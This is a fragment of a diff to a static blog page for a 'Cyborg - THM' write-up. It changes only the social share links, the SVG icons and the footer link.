                 d="M449.446,0c34.525,0 62.554,28.03 62.554,62.554l0,386.892c0,34.524 -28.03,62.554 -62.554,62.554l-386.892,0c-34.524,0 -62.554,-28.03 -62.554,-62.554l0,-386.892c0,-34.524 28.029,-62.554 62.554,-62.554l386.892,0Zm-3.446,265.638c0,-22.964 -18.616,-41.58 -41.58,-41.58c-11.211,0 -21.361,4.457 -28.841,11.666c-28.424,-20.508 -67.586,-33.757 -111.204,-35.278l18.941,-89.121l61.884,13.157c0.756,15.734 13.642,28.29 29.56,28.29c16.407,0 29.706,-13.299 29.706,-29.701c0,-16.403 -13.299,-29.702 -29.706,-29.702c-11.666,0 -21.657,6.792 -26.515,16.578l-69.105,-14.69c-1.922,-0.418 -3.939,-0.042 -5.585,1.036c-1.658,1.073 -2.811,2.761 -3.224,4.686l-21.152,99.438c-44.258,1.228 -84.046,14.494 -112.837,35.232c-7.468,-7.164 -17.589,-11.591 -28.757,-11.591c-22.965,0 -41.585,18.616 -41.585,41.58c0,16.896 10.095,31.41 24.568,37.918c-0.639,4.135 -0.99,8.328 -0.99,12.576c0,63.977 74.469,115.836 166.33,115.836c91.861,0 166.334,-51.859 166.334,-115.836c0,-4.218 -0.347,-8.387 -0.977,-12.493c14.564,-6.47 24.735,-21.034 24.735,-38.001Zm-119.474,108.193c-20.27,20.241 -59.115,21.816 -70.534,21.816c-11.428,0 -50.277,-1.575 -70.522,-21.82c-3.007,-3.008 -3.007,-7.882 0,-10.889c3.003,-2.999 7.882,-3.003 10.885,0c12.777,12.781 40.11,17.317 59.637,17.317c19.522,0 46.86,-4.536 59.657,-17.321c3.016,-2.999 7.886,-2.995 10.885,0.008c3.008,3.011 3.003,7.882 -0.008,10.889Zm-5.23,-48.781c-16.373,0 -29.701,-13.324 -29.701,-29.698c0,-16.381 13.328,-29.714 29.701,-29.714c16.378,0 29.706,13.333 29.706,29.714c0,16.374 -13.328,29.698 -29.706,29.698Zm-160.386,-29.702c0,-16.381 13.328,-29.71 29.714,-29.71c16.369,0 29.689,13.329 29.689,29.71c0,16.373 -13.32,29.693 -29.689,29.693c-16.386,0 -29.714,-13.32 -29.714,-29.693Z" />
         </svg>
     </a>
     <a target="_blank" rel="noopener noreferrer" aria-label="share Cyborg - THM on facebook"
-        href="https://facebook.com/sharer/sharer.php?u=https%3a%2f%2fsh3bu.github.io%2fthemes%2fhugo-PaperMod%2fposts%2fcyborg%2f">
+        href="https://facebook.com/sharer/sharer.php?u=https%3a%2f%2fsh3bu.github.io%2fposts%2fcyborg%2f">
         <svg version="1.1" viewBox="0 0 512 512" xml:space="preserve" height="30px" width="30px" fill="currentColor">
             <path
                 d="M449.446,0c34.525,0 62.554,28.03 62.554,62.554l0,386.892c0,34.524 -28.03,62.554 -62.554,62.554l-106.468,0l0,-192.915l66.6,0l12.672,-82.621l-79.272,0l0,-53.617c0,-22.603 11.073,-44.636 46.58,-44.636l36.042,0l0,-70.34c0,0 -32.71,-5.582 -63.982,-5.582c-65.288,0 -107.96,39.569 -107.96,111.204l0,62.971l-72.573,0l0,82.621l72.573,0l0,192.915l-191.104,0c-34.524,0 -62.554,-28.03 -62.554,-62.554l0,-386.892c0,-34.524 28.029,-62.554 62.554,-62.554l386.892,0Z" />
         </svg>
     </a>
     <a target="_blank" rel="noopener noreferrer" aria-label="share Cyborg - THM on whatsapp"
-        href="https://api.whatsapp.com/send?text=Cyborg%20-%20THM%20-%20https%3a%2f%2fsh3bu.github.io%2fthemes%2fhugo-PaperMod%2fposts%2fcyborg%2f">
+        href="https://api.whatsapp.com/send?text=Cyborg%20-%20THM%20-%20https%3a%2f%2fsh3bu.github.io%2fposts%2fcyborg%2f">
         <svg version="1.1" viewBox="0 0 512 512" xml:space="preserve" height="30px" width="30px" fill="currentColor">
             <path
                 d="M449.446,0c34.525,0 62.554,28.03 62.554,62.554l0,386.892c0,34.524 -28.03,62.554 -62.554,62.554l-386.892,0c-34.524,0 -62.554,-28.03 -62.554,-62.554l0,-386.892c0,-34.524 28.029,-62.554 62.554,-62.554l386.892,0Zm-58.673,127.703c-33.842,-33.881 -78.847,-52.548 -126.798,-52.568c-98.799,0 -179.21,80.405 -179.249,179.234c-0.013,31.593 8.241,62.428 23.927,89.612l-25.429,92.884l95.021,-24.925c26.181,14.28 55.659,21.807 85.658,21.816l0.074,0c98.789,0 179.206,-80.413 179.247,-179.243c0.018,-47.895 -18.61,-92.93 -52.451,-126.81Zm-126.797,275.782l-0.06,0c-26.734,-0.01 -52.954,-7.193 -75.828,-20.767l-5.441,-3.229l-56.386,14.792l15.05,-54.977l-3.542,-5.637c-14.913,-23.72 -22.791,-51.136 -22.779,-79.287c0.033,-82.142 66.867,-148.971 149.046,-148.971c39.793,0.014 77.199,15.531 105.329,43.692c28.128,28.16 43.609,65.592 43.594,105.4c-0.034,82.149 -66.866,148.983 -148.983,148.984Zm81.721,-111.581c-4.479,-2.242 -26.499,-13.075 -30.604,-14.571c-4.105,-1.495 -7.091,-2.241 -10.077,2.241c-2.986,4.483 -11.569,14.572 -14.182,17.562c-2.612,2.988 -5.225,3.364 -9.703,1.12c-4.479,-2.241 -18.91,-6.97 -36.017,-22.23c-13.314,-11.876 -22.304,-26.542 -24.916,-31.026c-2.612,-4.484 -0.279,-6.908 1.963,-9.14c2.016,-2.007 4.48,-5.232 6.719,-7.847c2.24,-2.615 2.986,-4.484 4.479,-7.472c1.493,-2.99 0.747,-5.604 -0.374,-7.846c-1.119,-2.241 -10.077,-24.288 -13.809,-33.256c-3.635,-8.733 -7.327,-7.55 -10.077,-7.688c-2.609,-0.13 -5.598,-0.158 -8.583,-0.158c-2.986,0 -7.839,1.121 -11.944,5.604c-4.105,4.484 -15.675,15.32 -15.675,37.364c0,22.046 16.048,43.342 18.287,46.332c2.24,2.99 31.582,48.227 76.511,67.627c10.685,4.615 19.028,7.371 25.533,9.434c10.728,3.41 20.492,2.929 28.209,1.775c8.605,-1.285 26.499,-10.833 30.231,-21.295c3.732,-10.464 3.732,-19.431 2.612,-21.298c-1.119,-1.869 -4.105,-2.99 -8.583,-5.232Z" />
         </svg>
     </a>
     <a target="_blank" rel="noopener noreferrer" aria-label="share Cyborg - THM on telegram"
-        href="https://telegram.me/share/url?text=Cyborg%20-%20THM&amp;url=https%3a%2f%2fsh3bu.github.io%2fthemes%2fhugo-PaperMod%2fposts%2fcyborg%2f">
+        href="https://telegram.me/share/url?text=Cyborg%20-%20THM&amp;url=https%3a%2f%2fsh3bu.github.io%2fposts%2fcyborg%2f">
         <svg version="1.1" xml:space="preserve" viewBox="2 2 28 28" height="30px" width="30px" fill="currentColor">
             <path
                 d="M26.49,29.86H5.5a3.37,3.37,0,0,1-2.47-1,3.35,3.35,0,0,1-1-2.47V5.48A3.36,3.36,0,0,1,3,3,3.37,3.37,0,0,1,5.5,2h21A3.38,3.38,0,0,1,29,3a3.36,3.36,0,0,1,1,2.46V26.37a3.35,3.35,0,0,1-1,2.47A3.38,3.38,0,0,1,26.49,29.86Zm-5.38-6.71a.79.79,0,0,0,.85-.66L24.73,9.24a.55.55,0,0,0-.18-.46.62.62,0,0,0-.41-.17q-.08,0-16.53,6.11a.59.59,0,0,0-.41.59.57.57,0,0,0,.43.52l4,1.24,1.61,4.83a.62.62,0,0,0,.63.43.56.56,0,0,0,.4-.17L16.54,20l4.09,3A.9.9,0,0,0,21.11,23.15ZM13.8,20.71l-1.21-4q8.72-5.55,8.78-5.55c.15,0,.23,0,.23.16a.18.18,0,0,1,0,.06s-2.51,2.3-7.52,6.8Z" />
@@ -631,7 +643,7 @@ Enter passphrase for key /root/Cyborg/home/field/dev/final_archive:
     </main>
     
 <footer class="footer">
-    <span>&copy; 2023 <a href="https://sh3bu.github.io/themes/hugo-PaperMod">Shebu 🔽</a></span>
+    <span>&copy; 2023 <a href="https://sh3bu.github.io/">Shebu</a></span>
     <span>
         Powered by
         <a href="https://gohugo.io/" rel="noopener noreferrer" target="_blank">Hugo</a> &
